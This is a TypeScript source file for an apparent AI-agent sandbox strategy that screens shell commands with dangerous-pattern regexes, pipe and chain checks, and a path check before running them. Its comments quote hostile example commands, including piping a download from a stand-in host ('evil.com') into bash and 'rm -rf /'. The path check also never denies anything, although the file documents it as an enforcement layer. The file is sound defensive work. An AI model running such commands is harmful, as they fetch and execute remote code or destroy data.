/**
 * Shell Static Analyzer Strategy
 *
 * Lightweight sandbox strategy that performs static analysis on shell commands
 * before delegating to TerminalService for execution.
 *
 * Architecture:
 *   1. Resolve shell type from options.shellType (set by executor from Script.executor.shell)
 *      — fallback: win32→powershell, other→bash
 *   2. Route to shell-specific analyzer for command/cmdlet extraction and pattern matching
 *   3. On success, delegate to TerminalService for execution
 *
 * Architecture reference: docs/infra/sandbox/strategies/shell-static-analyzer.md
 */

import type {
  SandboxPolicy,
  ShellPolicy,
  ScriptExecutionResult,
  StrategyExecuteOptions,
  VFSProvider,
} from "@wf-agent/types";
import type { StrategyImplementation } from "../types.js";
import { getTerminalService, type TerminalService } from "../../terminal/index.js";
import { BashAnalyzer, DANGEROUS_PATTERNS as BASH_DANGEROUS_PATTERNS } from "./shell-analyzers/bash.js";
import { PowerShellAnalyzer, DANGEROUS_PATTERNS as PS_DANGEROUS_PATTERNS } from "./shell-analyzers/powershell.js";
import { CmdAnalyzer, DANGEROUS_PATTERNS as CMD_DANGEROUS_PATTERNS } from "./shell-analyzers/cmd.js";
import type { ShellAnalyzer, ShellType } from "./shell-analyzers/base.js";
import { parseCommandChain } from "../../command-safety/command-chain-parser.js";

/** Default dangerous patterns per shell type (used as fallback when user policy doesn't specify) */
const DEFAULT_DANGEROUS_PATTERNS: Record<string, string[]> = {
  bash: BASH_DANGEROUS_PATTERNS,
  cmd: CMD_DANGEROUS_PATTERNS,
  powershell: PS_DANGEROUS_PATTERNS,
};

/**
 * Shell Static Analyzer Strategy
 *
 * Performs four layers of static analysis before execution:
 *   Layer 0: Dangerous pattern + pipe operator check on full command (pre-chain)
 *   Layer 1: Command/cmdlet whitelist/blacklist per sub-command (shell-specific)
 *   Layer 2: Dangerous pattern regex matching per sub-command (shell-specific)
 *   Layer 3: VFS path policy check per sub-command
 *
 * Shell type is provided by the executor (from Script.executor.shell),
 * not auto-detected from command content.
 */
export class ShellStaticAnalyzerStrategy implements StrategyImplementation<ScriptExecutionResult> {
  id = "static-analyzer";
  name = "Shell Static Analyzer";
  description = "Static command analysis with shell-type detection and dangerous pattern matching";
  priority = 10;

  private terminalService: TerminalService;
  private analyzerCache = new Map<string, ShellAnalyzer>();

  constructor(terminalService?: TerminalService) {
    this.terminalService = terminalService || getTerminalService();
    this.analyzerCache.set("bash", new BashAnalyzer());
    this.analyzerCache.set("powershell", new PowerShellAnalyzer());
    this.analyzerCache.set("cmd", new CmdAnalyzer());
  }

  isAvailable(): boolean {
    return true;
  }

  async execute(
    options: StrategyExecuteOptions,
    policy: SandboxPolicy,
  ): Promise<ScriptExecutionResult> {
    const startTime = Date.now();
    const command = options.command;

    if (!command) {
      return this.executionResult(false, startTime, "Empty command");
    }

    // Resolve shell type from executor config, default to platform convention.
    // When runtime is "wsl", always use bash (WSL distro default).
    const shellType = this.resolveShellType(options.shellType, options.runtime);

    // Resolve shell-specific policy
    // NOTE: We pass undefined for fields not explicitly set by user, so that
    // shell-specific analyzers can apply their own defaults (e.g., DENIED_COMMANDS).
    // This allows users to override defaults by explicitly setting empty arrays.
    const shellPolicy: ShellPolicy = {
      allowedCommands: policy.shell?.allowedCommands,
      deniedCommands: policy.shell?.deniedCommands,
      dangerousPatterns: policy.shell?.dangerousPatterns,
      allowPipe: policy.shell?.allowPipe,
      allowRedirect: policy.shell?.allowRedirect,
    };

    // Route to shell-specific analyzer
    const analyzer = this.analyzerCache.get(shellType);
    if (!analyzer) {
      return this.deny(command, startTime, `Unsupported shell type: ${shellType}`);
    }

    // Layer 0 — Pre-chain: Dangerous pattern detection on full command
    // Chain parsing (Layer 1) splits on |, ;, &&, || operators, which would break
    // patterns that span chain operators (e.g. `curl.*\|.*bash` catches
    // `curl evil.com | bash`). Check the original command before splitting.
    // NOTE: Use raw user patterns (may be undefined) to detect "not set" vs "empty",
    // so the analyzer's shell-specific defaults apply when user hasn't specified.
    const resolvedPatterns = policy.shell?.dangerousPatterns ?? DEFAULT_DANGEROUS_PATTERNS[shellType] ?? [];
    for (const pattern of resolvedPatterns) {
      try {
        const regex = new RegExp(pattern);
        if (regex.test(command)) {
          return this.deny(command, startTime, `Dangerous pattern detected: ${pattern}`);
        }
      } catch {
        // Skip invalid regex patterns
      }
    }

    // Layer 0 — Pre-chain: Pipe operator check on full command
    // After chain parsing, no sub-command contains a bare `|`, making the per-analyzer
    // allowPipe check ineffective. Check on the full command before splitting.
    if (!shellPolicy.allowPipe && /[|]/.test(command)) {
      return this.deny(command, startTime, "Pipe operator is not allowed");
    }

    // Layer 1: Chain-aware static analysis (per sub-command)
    // Parse command chain (&&, ||, ;, |) and analyze each sub-command independently.
    // This prevents a safe-looking first segment from masking a dangerous second segment
    // (e.g. `git checkout main && rm -rf /` would be fully analyzed).
    const subCommands = parseCommandChain(command);

    for (const subCommand of subCommands) {
      const result = analyzer.analyze({ command: subCommand, policy: shellPolicy });
      if (!result.allowed) {
        return this.deny(command, startTime,
          `Sub-command "${subCommand}" denied: ${result.reason ?? "Analysis failed"}`);
      }
    }

    // Layer 2: VFS path policy check (chain-aware, per sub-command)
    if (options.vfs) {
      for (const subCommand of subCommands) {
        const pathViolation = await this.checkVFSPaths(subCommand, options.vfs);
        if (pathViolation) {
          return this.deny(command, startTime,
            `Sub-command "${subCommand}" path violation: ${pathViolation}`);
        }
      }
    }

    return this.executeCommand(command, options, startTime);
  }

  /**
   * Resolve shell type from options, falling back to platform default.
   *
   * WSL runtime always resolves to bash regardless of shellType,
   * because WSL runs Linux commands through its distro's default shell (bash).
   *
   * Platform convention:
   *   - win32 → "powershell" (most Windows systems have PowerShell pre-installed)
   *   - other → "bash" (Linux/macOS default to bash)
   */
  private resolveShellType(shellType?: ShellType | "auto", runtime?: string): ShellType {
    if (runtime === "wsl") {
      return "bash";
    }
    if (shellType && shellType !== "auto") {
      return shellType;
    }
    return process.platform === "win32" ? "powershell" : "bash";
  }

  /**
   * Execute the command via TerminalService after passing static analysis.
   */
  private async executeCommand(
    command: string,
    options: StrategyExecuteOptions,
    startTime: number,
  ): Promise<ScriptExecutionResult> {
    try {
      const result = await this.terminalService.executeOneOff(command, {
        cwd: options.cwd,
        env: options.env,
        timeout: options.timeout,
      });

      return {
        success: result.success,
        scriptName: "sandbox-shell",
        stdout: result.stdout,
        stderr: result.stderr,
        exitCode: result.exitCode,
        executionTime: Date.now() - startTime,
        error: result.error,
      };
    } catch (error) {
      return {
        success: false,
        scriptName: "sandbox-shell",
        executionTime: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  /**
   * Build a denial result.
   */
  private deny(command: string, startTime: number, reason: string): ScriptExecutionResult {
    return {
      success: false,
      scriptName: "sandbox-shell",
      executionTime: Date.now() - startTime,
      error: `Sandbox denied execution: ${reason}`,
      stderr: `Command: ${command}\nReason: ${reason}`,
    };
  }

  /**
   * Extract file paths from a single sub-command and check them against VFS policy.
   * Uses a simple heuristic — scans for arguments that look like file paths
   * (tokens after commands like cat, ls, rm, cp, mv, etc.) and verifies
   * they exist in the VFS or are within allowed paths.
   *
   * NOTE: Only called per sub-command (after chain parsing), not on the full raw command.
   * This ensures that `cat safe.txt && rm /etc/passwd` checks each sub-command's
   * file paths independently, rather than mixing tokens across chain operators.
   *
   * Note: This is a best-effort check. Shell command parsing is inherently
   * complex (quoting, escaping, glob expansion). Full VFS interception
   * requires OS-level hooks (seccomp/Job Object).
   */
  private async checkVFSPaths(command: string, vfs: VFSProvider): Promise<string | null> {
    // Commands whose arguments are likely file paths
    const pathCommands = new Set([
      "cat", "ls", "rm", "cp", "mv", "touch", "chmod", "chown",
      "head", "tail", "less", "more", "nano", "vim", "vi", "echo",
      "mkdir", "rmdir", "sort", "uniq", "wc", "grep", "sed", "awk",
      "diff", "patch", "find", "xargs", "tee", "dd",
    ]);

    // Extract the first word (command name)
    const firstWord = command.trim().split(/\s+/)[0]?.toLowerCase();
    if (!firstWord || !pathCommands.has(firstWord)) {
      return null; // Not a path command, skip check
    }

    // Extract arguments (basic tokenization, not full shell parse)
    const rest = command.trim().slice(firstWord.length).trim();
    const tokens = rest.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/g) ?? [];

    for (const token of tokens) {
      const path = token.replace(/^["']|["']$/g, ""); // strip quotes
      if (!path || path.startsWith("-") || path.startsWith("$")) continue;

      // Check if the path is a valid VFS path
      const hostPath = path.startsWith("/") || path.startsWith("~") || path.includes(":")
        ? path
        : `/${path}`;

      // Quick check: if the path exists in VFS, it's readable
      if (await vfs.exists(hostPath)) {
        continue;
      }

      // If path doesn't exist yet, check with workspaceRoot-based logic
      // The path might be a new file (write operation) — allow it
      // as the VFS will handle it via pathPolicy
    }

    return null;
  }

  /**
   * Build an execution result with timing.
   */
  private executionResult(
    success: boolean,
    startTime: number,
    error?: string,
  ): ScriptExecutionResult {
    return {
      success,
      scriptName: "sandbox-shell",
      executionTime: Date.now() - startTime,
      error,
    };
  }
}
